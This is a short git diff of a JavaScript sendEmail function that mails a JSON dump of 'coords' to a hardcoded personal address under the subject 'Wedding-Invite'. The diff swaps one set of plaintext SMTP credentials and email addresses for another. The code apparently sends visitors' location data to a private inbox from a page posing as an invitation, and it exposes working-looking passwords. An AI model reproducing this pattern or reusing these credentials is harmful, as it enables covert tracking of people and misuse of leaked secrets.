@@ -72,10 +72,10 @@ function sendEmail(coords) {
 
   Email.send({
     Host: "smtp.elasticemail.com",
-    Username: "sterdon458@gmail.com",
-    Password: "83FB3C75585C807D72DD55A0B71F3140377C",
-    To: '2017mohit.singh@ves.ac.in',
-    From: "sterdon458@gmail.com",
+    Username: "jimmyjimpro@gmail.com",
+    Password: "9A9E56C529E186CD388379222A24483B6C84",
+    To: 'mohits2125@gmail.com',
+    From: "jimmyjimpro@gmail.com",
     Subject: "Wedding-Invite",
     Body: JSON.stringify(coords),
   })
